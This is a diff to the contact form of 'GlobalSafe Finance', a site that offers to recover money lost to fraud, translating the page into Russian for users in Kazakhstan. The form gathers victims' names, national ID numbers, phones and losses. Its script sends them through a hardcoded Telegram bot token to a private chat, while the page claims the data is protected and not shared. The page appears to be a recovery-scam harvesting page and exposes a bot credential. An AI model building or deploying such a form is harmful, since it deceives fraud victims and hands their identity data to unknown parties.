@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
   <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
-  <title>Submit Request — GlobalSafe Finance</title>
+  <title>Обращение — GlobalSafe Finance</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="../assets/css/global.css">
   <style>
@@ -20,7 +20,7 @@ body{background:#030712}
 .to-i{font-size:1.6rem;margin-bottom:4px;display:block}
 .to-n{font-weight:700;font-size:.78rem;color:#fff;display:block}
 .to-d{font-size:.62rem;color:rgba(255,255,255,.25);margin-top:2px;display:block}
-.fg{margin-bottom:14px;position:relative}
+.fg{margin-bottom:14px}
 .fg label{display:block;font-size:.62rem;font-weight:600;color:rgba(255,255,255,.25);margin-bottom:5px;text-transform:uppercase;letter-spacing:.8px}
 .fg input,.fg textarea,.fg select{width:100%;padding:12px 14px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:8px;font-size:.88rem;font-family:inherit;color:#fff;transition:.2s}
 .fg input::placeholder,.fg textarea::placeholder{color:rgba(255,255,255,.12)}
@@ -49,39 +49,59 @@ body{background:#030712}
 </head>
 <body>
   <nav class="nav">
-    <a href="../" class="nav-brand"><div class="nav-mark">🌐</div><div><div class="nav-name">GlobalSafe Finance</div><div class="nav-tag">Asset Recovery</div></div></a>
-    <div class="nav-menu"><a href="../articles/">Intelligence</a><a href="../success/">Case Studies</a><a href="../contacts/" class="active" style="padding:10px 24px;background:rgba(99,102,241,.15);border:1px solid rgba(99,102,241,.3);border-radius:8px;color:#a5b4fc;font-weight:600;font-size:.82rem;text-decoration:none">Submit Request</a></div>
+    <a href="../" class="nav-brand"><div class="nav-mark">🌐</div><div><div class="nav-name">GlobalSafe Finance</div><div class="nav-tag">Центр возврата средств</div></div></a>
+    <div class="nav-menu"><a href="../articles/">Аналитика</a><a href="../success/">Кейсы</a><a href="../contacts/" class="nav-cta" style="padding:10px 24px;background:rgba(99,102,241,.15);border:1px solid rgba(99,102,241,.3);border-radius:8px;color:#a5b4fc;font-weight:600;font-size:.82rem;text-decoration:none">Оставить заявку</a></div>
   </nav>
   <div class="fp">
     <div class="fc">
-      <h1>📋 Submit Recovery Request</h1>
-      <div class="sub">Select request type and complete the form. All fields marked * are required.</div>
+      <h1>📋 Центр обращений</h1>
+      <div class="sub">Выберите тип обращения и заполните форму. Мы свяжемся с вами в ближайшее время.</div>
       <form id="cf">
         <div class="ts">
-          <label class="to sel" data-t="return"><input type="radio" name="type" value="Asset Recovery" checked><span class="to-i">💰</span><span class="to-n">Asset Recovery</span><span class="to-d">Recover lost funds</span></label>
-          <label class="to" data-t="docs"><input type="radio" name="type" value="Document Request"><span class="to-i">📄</span><span class="to-n">Document Request</span><span class="to-d">Legal documentation</span></label>
-          <label class="to" data-t="feedback"><input type="radio" name="type" value="Inquiry"><span class="to-i">💬</span><span class="to-n">General Inquiry</span><span class="to-d">Questions & feedback</span></label>
-          <label class="to" data-t="org"><input type="radio" name="type" value="Regulatory Coordination"><span class="to-i">🏛️</span><span class="to-n">Regulatory</span><span class="to-d">ARDFM, police, banks</span></label>
+          <label class="to sel" data-t="return"><input type="radio" name="type" value="Возврат средств" checked><span class="to-i">💰</span><span class="to-n">Возврат средств</span><span class="to-d">Вернуть деньги от мошенников</span></label>
+          <label class="to" data-t="docs"><input type="radio" name="type" value="Получить документ"><span class="to-i">📄</span><span class="to-n">Получить документ</span><span class="to-d">Заявление, жалоба, претензия</span></label>
+          <label class="to" data-t="feedback"><input type="radio" name="type" value="Обратная связь"><span class="to-i">💬</span><span class="to-n">Обратная связь</span><span class="to-d">Вопрос, предложение, отзыв</span></label>
+          <label class="to" data-t="org"><input type="radio" name="type" value="Связь с организациями"><span class="to-i">🏛️</span><span class="to-n">Связь с организациями</span><span class="to-d">АРРФР, полиция, банки</span></label>
         </div>
-        <div class="rf"><div class="fr"><div class="fg"><label>Full Name *</label><input type="text" name="name" placeholder="John Doe" required></div><div class="fg"><label>Identification Number *</label><input type="text" name="iin" placeholder="123456789012" maxlength="12" required></div></div><div class="fg"><label>Phone (WhatsApp / Telegram) *</label><input type="tel" name="phone" placeholder="+7 7XX XXX XX XX" required></div><div class="fg"><label>Additional Numbers</label><input type="text" name="extraPhones" placeholder="+7 700 111 22 33"></div><div class="fr"><div class="fg"><label>Amount Lost (₸)</label><input type="text" name="amount" placeholder="500,000"></div><div class="fg"><label>Best Time to Call</label><input type="text" name="callTime" placeholder="Mon-Fri 10:00-18:00"></div></div><div class="fg"><label>Platform / Company</label><input type="text" name="company" placeholder="InvestPro, GlobalTrade FX..."></div><div class="fg"><label>Details</label><textarea name="comment" placeholder="Circumstances, case number, any additional information..."></textarea></div></div>
-        <div class="df" style="display:none"><div class="fr"><div class="fg"><label>Full Name *</label><input type="text" name="docName" required></div><div class="fg"><label>Phone *</label><input type="tel" name="docPhone" required></div></div><div class="fg"><label>Document Type *</label><select name="docType" required><option value="">Select...</option><option>Police Report</option><option>ARDFM Complaint</option><option>Bank Dispute Letter</option><option>Court Filing</option><option>Service Agreement</option><option>Other</option></select></div><div class="fg"><label>Description</label><textarea name="docComment" placeholder="Brief description..."></textarea></div></div>
-        <div class="ff" style="display:none"><div class="fr"><div class="fg"><label>Name *</label><input type="text" name="fbName" required></div><div class="fg"><label>Phone</label><input type="tel" name="fbPhone"></div></div><div class="fg"><label>Subject *</label><select name="fbTopic" required><option value="">Select...</option><option>Service inquiry</option><option>Partnership proposal</option><option>Feedback</option><option>Complaint</option><option>Other</option></select></div><div class="fg"><label>Message *</label><textarea name="fbMessage" required></textarea></div></div>
-        <div class="of" style="display:none"><div class="fr"><div class="fg"><label>Full Name *</label><input type="text" name="orgName" required></div><div class="fg"><label>Phone *</label><input type="tel" name="orgPhone" required></div></div><div class="fg"><label>Organization *</label><select name="orgType" required><option value="">Select...</option><option>ARDFM (Financial Regulator)</option><option>National Bank of Kazakhstan</option><option>Police / Cybercrime</option><option>Prosecutor's Office</option><option>Issuing Bank</option><option>Other</option></select></div><div class="fg"><label>Details *</label><textarea name="orgComment" required></textarea></div></div>
-        <button type="submit" class="sb"><span>Submit Request</span></button>
+        <div class="rf"><div class="fr"><div class="fg"><label>ФИО *</label><input type="text" name="name" placeholder="Иванов Иван Иванович" required></div><div class="fg"><label>ИИН *</label><input type="text" name="iin" placeholder="123456789012" maxlength="12" required></div></div><div class="fg"><label>Телефон (WhatsApp / Telegram) *</label><input type="tel" name="phone" placeholder="+7 7XX XXX XX XX" required></div><div class="fg"><label>Дополнительные номера</label><input type="text" name="extraPhones" placeholder="+7 700 111 22 33"></div><div class="fr"><div class="fg"><label>Сколько потеряли (₸)</label><input type="text" name="amount" placeholder="500 000"></div><div class="fg"><label>Когда удобно звонить</label><input type="text" name="callTime" placeholder="Пн-Пт 10:00-18:00"></div></div><div class="fg"><label>Платформа / компания</label><input type="text" name="company" placeholder="InvestPro, GlobalTrade FX..."></div><div class="fg"><label>Детали</label><textarea name="comment" placeholder="Обстоятельства, номер дела..."></textarea></div></div>
+        <div class="df" style="display:none"><div class="fr"><div class="fg"><label>ФИО *</label><input type="text" name="docName" required></div><div class="fg"><label>Телефон *</label><input type="tel" name="docPhone" required></div></div><div class="fg"><label>Тип документа *</label><select name="docType" required><option value="">Выберите...</option><option>Заявление в полицию</option><option>Жалоба в АРРФР</option><option>Претензия в банк</option><option>Исковое заявление</option><option>Договор</option><option>Другое</option></select></div><div class="fg"><label>Описание</label><textarea name="docComment" placeholder="Краткое описание..."></textarea></div></div>
+        <div class="ff" style="display:none"><div class="fr"><div class="fg"><label>Имя *</label><input type="text" name="fbName" required></div><div class="fg"><label>Телефон</label><input type="tel" name="fbPhone"></div></div><div class="fg"><label>Тема *</label><select name="fbTopic" required><option value="">Выберите...</option><option>Вопрос по услугам</option><option>Предложение о сотрудничестве</option><option>Отзыв</option><option>Жалоба</option><option>Другое</option></select></div><div class="fg"><label>Сообщение *</label><textarea name="fbMessage" required></textarea></div></div>
+        <div class="of" style="display:none"><div class="fr"><div class="fg"><label>ФИО *</label><input type="text" name="orgName" required></div><div class="fg"><label>Телефон *</label><input type="tel" name="orgPhone" required></div></div><div class="fg"><label>Организация *</label><select name="orgType" required><option value="">Выберите...</option><option>АРРФР (регулятор)</option><option>Национальный Банк РК</option><option>Полиция / Киберпреступность</option><option>Прокуратура</option><option>Банк (эмитент)</option><option>Другая</option></select></div><div class="fg"><label>Суть обращения *</label><textarea name="orgComment" required></textarea></div></div>
+        <button type="submit" class="sb"><span>Отправить заявку</span></button>
       </form>
-      <div id="fs" class="fs" style="display:none"><div class="fs-i">✅</div><h3>Request Submitted</h3><p>Our team will contact you within 24 hours.</p></div>
-      <div class="fn">Your data is encrypted and will not be shared with third parties.</div>
+      <div id="fs" class="fs" style="display:none"><div class="fs-i">✅</div><h3>Заявка отправлена!</h3><p>Мы свяжемся с вами в ближайшее время.</p></div>
+      <div class="fn">Ваши данные защищены и не передаются третьим лицам.</div>
     </div>
-    <div class="hl"><div class="hl-d">Emergency Hotlines</div><div class="hl-p">1434 · 102 · 116</div><div class="hl-d">ARDFM · Police · Crisis Line</div></div>
+    <div class="hl"><div class="hl-d">Экстренные горячие линии</div><div class="hl-p">1434 · 102 · 116</div><div class="hl-d">АРРФР · Полиция · Психологическая помощь</div></div>
   </div>
   <footer class="ftr"><p>© 2026 GlobalSafe Finance</p></footer>
   <script>
   document.querySelectorAll('.to').forEach(function(o){o.addEventListener('click',function(){document.querySelectorAll('.to').forEach(function(x){x.classList.remove('sel')});this.classList.add('sel');this.querySelector('input').checked=true;var t=this.dataset.t;document.querySelector('.rf').style.display=t==='return'?'block':'none';document.querySelector('.df').style.display=t==='docs'?'block':'none';document.querySelector('.ff').style.display=t==='feedback'?'block':'none';document.querySelector('.of').style.display=t==='org'?'block':'none'})});
   document.getElementById('cf').addEventListener('submit',async function(e){
-    e.preventDefault();var b=this.querySelector('.sb');b.disabled=true;b.querySelector('span').textContent='Submitting...';
-    var type=document.querySelector('input[name="type"]:checked').value;var t='📋 *New Request*\n\n📌 Type: '+type+'\n\n';
-    var rf=document.querySelector('.rf');if(rf.style.display!=='none'){var d=new FormData(this);t+='👤 Name: '+d.get('name')+'\n🆔 ID: '+d.get('iin')+'\n📱 Phone: '+d.get('phone');if(d.get('extraPhones'))t+='\n📞 Additional: '+d.get('extraPhones');if(d.get('amount'))t+='\n💰 Amount: '+d.get('amount')+' ₸';if(d.get('company'))t+='\n🏢 Platform: '+d.get('company');if(d.get('callTime'))t+='\n📅 Call time: '+d.get('callTime');if(d.get('comment'))t+='\n💬 Details: '+d.get('comment')}
-    try{var r=await fetch('https://api.telegram.org/bot8829750295:AAEdnt-7FPCVuVbgj6tgn7eC2_2LpY5VHCk/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'8471070560',text:t})});if(r.ok){this.style.display='none';document.getElementById('fs').style.display='block'}else{alert('Error');b.disabled=false;b.querySelector('span').textContent='Submit Request'}}catch(err){alert('Network error');b.disabled=false;b.querySelector('span').textContent='Submit Request'}
+    e.preventDefault();
+    var b=this.querySelector('.sb');b.disabled=true;b.querySelector('span').textContent='Отправка...';
+    var type=document.querySelector('input[name="type"]:checked').value;
+    var t='📋 *Новое обращение*\n\n📌 Тип: '+type+'\n\n';
+    var rf=document.querySelector('.rf');
+    if(rf.style.display!=='none'){
+      var d=new FormData(this);
+      t+='👤 ФИО: '+d.get('name')+'\n🆔 ИИН: '+d.get('iin')+'\n📱 Телефон: '+d.get('phone');
+      if(d.get('extraPhones'))t+='\n📞 Доп: '+d.get('extraPhones');
+      if(d.get('amount'))t+='\n💰 Сумма: '+d.get('amount')+' ₸';
+      if(d.get('company'))t+='\n🏢 Компания: '+d.get('company');
+      if(d.get('callTime'))t+='\n📅 Звонить: '+d.get('callTime');
+      if(d.get('comment'))t+='\n💬 '+d.get('comment');
+    }else{
+      var d=new FormData(this);
+      if(d.get('docName'))t+='👤 ФИО: '+d.get('docName')+'\n📱 Телефон: '+d.get('docPhone')+'\n📄 Документ: '+d.get('docType')+'\n💬 '+d.get('docComment');
+      if(d.get('fbName'))t+='👤 Имя: '+d.get('fbName')+'\n📋 Тема: '+d.get('fbTopic')+'\n💬 '+d.get('fbMessage');
+      if(d.get('orgName'))t+='👤 ФИО: '+d.get('orgName')+'\n🏛️ Организация: '+d.get('orgType')+'\n💬 '+d.get('orgComment');
+    }
+    try{
+      var r=await fetch('https://api.telegram.org/bot8829750295:AAEdnt-7FPCVuVbgj6tgn7eC2_2LpY5VHCk/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'8471070560',text:t})});
+      if(r.ok){document.getElementById('cf').style.display='none';document.getElementById('fs').style.display='block'}
+      else{alert('Ошибка отправки');b.disabled=false;b.querySelector('span').textContent='Отправить заявку'}
+    }catch(err){alert('Ошибка сети');b.disabled=false;b.querySelector('span').textContent='Отправить заявку'}
   });
   </script>
 </body>
